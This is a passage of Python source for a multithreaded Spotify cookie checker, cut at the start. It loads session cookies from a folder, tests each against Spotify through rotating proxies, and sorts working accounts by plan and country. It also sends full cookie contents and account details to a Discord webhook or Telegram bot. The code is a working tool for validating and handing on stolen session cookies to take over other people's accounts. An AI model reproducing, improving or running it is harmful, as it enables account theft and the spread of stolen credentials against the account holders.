                json={"chat_id": chat_id, "text": message_text, "parse_mode": "HTML", "disable_web_page_preview": True},
                timeout=20
            )
    except:
        pass

def send_notifications(config, data, output_filename, formatted_cookie):
    notifications = config.get("notifications", {})
    webhook_cfg = notifications.get("webhook", {})
    tg_cfg = notifications.get("telegram", {})
    webhook_mode = str(webhook_cfg.get("mode", "full")).lower()
    tg_mode = str(tg_cfg.get("mode", "full")).lower()
    eligible_invite = is_family_owner_with_slots(data) and (data.get("inviteLink") or data.get("address"))

    if webhook_cfg.get("enabled", False):
        if webhook_mode == "invite_address_only":
            if eligible_invite:
                send_discord_webhook(
                    webhook_cfg.get("url", ""),
                    build_invite_address_message(data),
                    image_url=get_notification_image_url(data, invite_mode=True)
                )
        else:
            send_discord_webhook(
                webhook_cfg.get("url", ""),
                build_full_notification_message_discord(data),
                output_filename,
                formatted_cookie,
                image_url=get_notification_image_url(data, invite_mode=False)
            )

    if tg_cfg.get("enabled", False):
        if tg_mode == "invite_address_only":
            if eligible_invite:
                send_telegram(
                    tg_cfg.get("bot_token", ""),
                    tg_cfg.get("chat_id", ""),
                    build_invite_address_message_telegram(data),
                    image_url=get_notification_image_url(data, invite_mode=True)
                )
        else:
            send_telegram(
                tg_cfg.get("bot_token", ""),
                tg_cfg.get("chat_id", ""),
                build_full_notification_message_telegram(data),
                output_filename,
                formatted_cookie
            )

def generate_filename(country, plan_name):
    safe_plan = plan_name.replace(' ', '-').replace('_', '-')
    safe_country = country.replace(' ', '-').replace('_', '-')
    randnum = random_number_string()
    return f"{safe_country}_github-harshitkamboj_{safe_plan}_{randnum}.txt"

def convert_json_to_netscape(json_data):
    netscape_lines = []
    for cookie in json_data:
        domain = cookie.get('domain', '')
        tail_match = "TRUE" if domain.startswith('.') else "FALSE"
        path = cookie.get('path', '/')
        secure = "TRUE" if cookie.get('secure', False) else "FALSE"
        expires = str(cookie.get('expirationDate', 0))
        name = cookie.get('name', '')
        value = cookie.get('value', '')
        line = f"{domain}\t{tail_match}\t{path}\t{secure}\t{expires}\t{name}\t{value}"
        netscape_lines.append(line)
    return '\n'.join(netscape_lines)

def is_netscape_cookie_line(line):
    parts = line.strip().split('\t')
    if len(parts) < 7:
        return False
    if parts[1].upper() not in ("TRUE", "FALSE"):
        return False
    if parts[3].upper() not in ("TRUE", "FALSE"):
        return False
    if not re.match(r"^-?\d+$", parts[4].strip()):
        return False
    return True

def normalize_netscape_cookie_text(raw_text):
                                                                          
    clean_lines = []
    for line in raw_text.splitlines():
        if is_netscape_cookie_line(line):
            clean_lines.append(line.strip())
    return '\n'.join(clean_lines)

def cookies_dict_from_netscape(netscape_text):
    cookies = {}
    for line in netscape_text.splitlines():
        parts = line.strip().split('\t')
        if len(parts) >= 7:
            name = parts[5]
            value = parts[6]
            cookies[name] = value
    return cookies

def print_status_message(status, cookie_file, folder_name):
    color_codes = {
        'success': '\033[33m',
        'free': '\033[34m',
        'duplicate': '\033[35m',
        'failed': '\033[31m',
        'error': '\033[31m'
    }
    reset_code = '\033[0m'
    base_path = f"cookies\\{cookie_file}"
    if status == 'success':
        print(f"> {color_codes[status]}Login successful with {base_path}. Moved to hits folder!{reset_code}")
    elif status == 'free':
        print(f"> {color_codes[status]}Login successful with {base_path}. But the user is not subscribed. Moved to free folder!{reset_code}")
    elif status == 'failed':
        print(f"> {color_codes[status]}Login failed with {base_path}. Moved to failed folder!{reset_code}")
    elif status == 'duplicate':
        print(f"> {color_codes[status]}Duplicate account email with {base_path}. Skipped (no output saved).{reset_code}")
    elif status == 'error':
        print(f"> {color_codes[status]}Error occurred with {base_path}. Moved to broken folder!{reset_code}")

def checkCookies(num_threads=1, config=None):
    if config is None:
        config = copy.deepcopy(DEFAULT_CONFIG)
    counts = {'hits': 0, 'free': 0, 'bad': 0, 'duplicate': 0, 'errors': 0}
    plan_counts = {
        "duo_premium": 0,
        "family_premium_v2": 0,
        "family_basic": 0,
        "premium": 0,
        "premium_mini": 0,
        "basic_premium": 0,
        "student_premium": 0,
        "student_premium_hulu": 0,
        "free": 0,
        "unknown": 0
    }
    owner_plan_counts = {
        "duo_premium": 0,
        "family_premium_v2": 0,
        "family_basic": 0
    }
    display_cfg = config.get("display", {})
    display_mode = str(display_cfg.get("mode", "log")).lower()
    if display_mode not in ("log", "simple"):
        display_mode = "log"
    use_colors = True
    proxies = load_proxies()
    retries_cfg = config.get("retries", {})
    max_retry_attempts = retries_cfg.get("error_proxy_attempts", 3)
    dedupe_by_email = True
    try:
        max_retry_attempts = max(1, int(max_retry_attempts))
    except:
        max_retry_attempts = 3
    retryable_status_codes = {403, 429, 500, 502, 503, 504}
    cookies_list = os.listdir("cookies") if os.path.exists("cookies") else []
    cookies_total = len(cookies_list)
    cookies_left = [cookies_total]
    seen_emails = set()
    def update_title():
        valid = counts['hits'] + counts['free']
        set_console_title(
            f"CookiesLeft {cookies_left[0]}/{cookies_total} Valid {valid} "
            f"Failed {counts['bad']} Duplicate {counts.get('duplicate', 0)} Errors {counts['errors']}"
        )
    update_title()
    if display_mode == "log":
        print(f"Total cookies: {cookies_total}")
        print(f"Total proxies: {len(proxies)}")
        print(f"Number of threads: {num_threads}")
        print("\nStarting cookie checking...\n")
    else:
        render_simple_dashboard(counts, plan_counts, owner_plan_counts, cookies_left[0], cookies_total, use_colors)
    run_folder = get_run_folder()
    header_lock = threading.Lock()
    dedupe_lock = threading.Lock()
    def get_next_proxy(used_proxy_indices):
        if not proxies:
            return None, None
        available = [idx for idx in range(len(proxies)) if idx not in used_proxy_indices]
        if not available:
            available = list(range(len(proxies)))
        chosen_index = random.choice(available)
        return proxies[chosen_index], chosen_index

    def checkCookie(cookie_file):
        plan_key = None
        result_type = None
        owner_plan_key = None
        try:
            cookie_path = os.path.join("cookies", cookie_file)
            with open(cookie_path, 'r', encoding='utf-8') as f:
                content = f.read()
            try:
                cookies_json = json.loads(content)
                netscape_content = convert_json_to_netscape(cookies_json)
                netscape_content = normalize_netscape_cookie_text(netscape_content)
                cookies = cookies_dict_from_netscape(netscape_content)
            except:
                netscape_content = normalize_netscape_cookie_text(content)
                cookies = cookies_dict_from_netscape(netscape_content)
            session = requests.Session()
            session.cookies.update(cookies)
            session.headers.update({'Accept-Encoding': 'identity'})
            data = None
            status_code = None
            last_exception = None
            used_proxy_indices = set()

            for attempt in range(max_retry_attempts):
                proxy, proxy_index = get_next_proxy(used_proxy_indices)
                if proxy_index is not None:
                    used_proxy_indices.add(proxy_index)

                try:
                    data, status_code = get_account_data_from_new_api(session, proxy)
                    if status_code == 200 and data:
                        attempt_plan = data.get("currentPlan", "unknown")
                        if attempt_plan == "unknown" and attempt < max_retry_attempts - 1:
                                                                                  
                            continue
                        break
                    if status_code in retryable_status_codes and attempt < max_retry_attempts - 1:
                        continue
                    break
                except Exception as req_error:
                    last_exception = req_error
                    data = None
                    status_code = None
                    if attempt < max_retry_attempts - 1:
                        continue

            if status_code == 200 and data:
                current_plan = data.get("currentPlan", "unknown")
                plan_key = current_plan if current_plan in plan_counts else "unknown"
                if current_plan in owner_plan_counts and data.get("isSubAccount") is False:
                    owner_plan_key = current_plan
                country = data.get("country", "unknown")
                plan_display_name = plan_name_mapping(current_plan)
                email_key = str(data.get("email", "")).strip().lower()
                is_duplicate = False
                if dedupe_by_email and email_key:
                    with dedupe_lock:
                        if email_key in seen_emails:
                            is_duplicate = True
                        else:
                            seen_emails.add(email_key)

                if is_duplicate:
                    result_type = "duplicate"
                    if display_mode == "log":
                        print_status_message('duplicate', cookie_file, 'cookies')
                    os.remove(cookie_path)
                else:
                    if current_plan == "free":
                        result_type = "free"
                        if display_mode == "log":
                            print_status_message('free', cookie_file, 'free')
                    else:
                        result_type = "success"
                        if display_mode == "log":
                            print_status_message('success', cookie_file, 'hits')
                    is_sub_account = data.get("isSubAccount")
                    output_path = create_output_folder_when_needed(current_plan, is_sub_account, run_folder)
                    new_filename = generate_filename(country, plan_display_name)
                    formatted_cookie = format_cookie_file(data, netscape_content, config)
                    output_file = os.path.join(output_path, new_filename)
                    with open(output_file, 'w', encoding='utf-8') as out_f:
                        out_f.write(formatted_cookie)
                    send_notifications(config, data, new_filename, formatted_cookie)
                    os.remove(cookie_path)
            elif last_exception is not None or status_code in retryable_status_codes:
                result_type = "error"
                if display_mode == "log":
                    print_status_message('error', cookie_file, 'broken')
                shutil.move(cookie_path, os.path.join("broken", cookie_file))
            else:
                result_type = "failed"
                if display_mode == "log":
                    print_status_message('failed', cookie_file, 'failed')
                shutil.move(cookie_path, os.path.join("failed", cookie_file))
        except Exception:
            result_type = "error"
            if display_mode == "log":
                print_status_message('error', cookie_file, 'broken')
            try:
                shutil.move(cookie_path, os.path.join("broken", cookie_file))
            except:
                pass
        with header_lock:
            if result_type == "success":
                counts['hits'] += 1
                if plan_key:
                    plan_counts[plan_key] = plan_counts.get(plan_key, 0) + 1
                if owner_plan_key:
                    owner_plan_counts[owner_plan_key] = owner_plan_counts.get(owner_plan_key, 0) + 1
            elif result_type == "free":
                counts['free'] += 1
                if plan_key:
                    plan_counts[plan_key] = plan_counts.get(plan_key, 0) + 1
                if owner_plan_key:
                    owner_plan_counts[owner_plan_key] = owner_plan_counts.get(owner_plan_key, 0) + 1
            elif result_type == "failed":
                counts['bad'] += 1
            elif result_type == "duplicate":
                counts['duplicate'] += 1
            elif result_type == "error":
                counts['errors'] += 1
            cookies_left[0] -= 1
            update_title()
            if display_mode == "simple":
                render_simple_dashboard(counts, plan_counts, owner_plan_counts, cookies_left[0], cookies_total, use_colors)
    def worker():
        while True:
            try:
                cookie = cookies_list.pop(0)
            except IndexError:
                break
            checkCookie(cookie)
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=worker)
        threads.append(thread)
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()
    valid = counts['hits'] + counts['free']
    set_console_title(f"SpotifyChecker - Finished Valid {valid} Failed {counts['bad']} Errors {counts['errors']}")
    if display_mode == "simple":
        render_simple_dashboard(counts, plan_counts, owner_plan_counts, cookies_left[0], cookies_total, use_colors)
        print("")
        print(color_text("Finished Checking", "\033[32m", use_colors))
    else:
        print("\n\n==================== Final Summary ====================")
        print(f"Checked   : {cookies_total}")
        print(f"Good      : \033[33m{counts['hits']}\033[0m")
        print(f"Free      : \033[34m{counts['free']}\033[0m")
        print(f"Bad       : \033[31m{counts['bad']}\033[0m")
        print(f"Duplicate : \033[35m{counts.get('duplicate', 0)}\033[0m")
        print(f"Errors    : \033[31m{counts['errors']}\033[0m")
        print("=======================================================")

def main():
    create_base_folders()
    config, config_source = load_config()
    clear_screen()
    print("""
        ██████████████████████████████████████████████████████████████████████████████████
        █─▄▄▄▄█▄─▄▄─█─▄▄─█─▄─▄─█▄─▄█▄─▄▄─█▄─█─▄███─▄▄▄─█─█─█▄─▄▄─█─▄▄▄─█▄─█─▄█▄─▄▄─█▄─▄▄▀█
        █▄▄▄▄─██─▄▄▄█─██─███─████─███─▄████▄─▄████─███▀█─▄─██─▄█▀█─███▀██─▄▀███─▄█▀██─▄─▄█
        ▀▄▄▄▄▄▀▄▄▄▀▀▀▄▄▄▄▀▀▄▄▄▀▀▄▄▄▀▄▄▄▀▀▀▀▄▄▄▀▀▀▀▄▄▄▄▄▀▄▀▄▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▀▄▄▀▄▄▄▄▄▀▄▄▀▄▄▀
    by https://github.com/harshitkamboj | website: harshitkamboj.in | discord: illuminatis69
                        (Star The Repo 🌟 and Share for more Checkers)

--------------------------------------------------------------------------------------------------

            👉  Welcome, after moving your cookies to (cookies) folder, press  👈
                              Enter if you're ready to start!
    """)
    input()
    try:
        num_threads_input = input("Enter number of threads (default 10): ")
        num_threads = int(num_threads_input) if num_threads_input.strip() else 10
        if num_threads < 1 or num_threads > 100:
            raise ValueError
    except ValueError:
        print("Invalid input, using 10 threads as default")
        num_threads = 10
    checkCookies(num_threads, config)
    input("Press enter to exit\n")

if __name__ == "__main__":
    main()
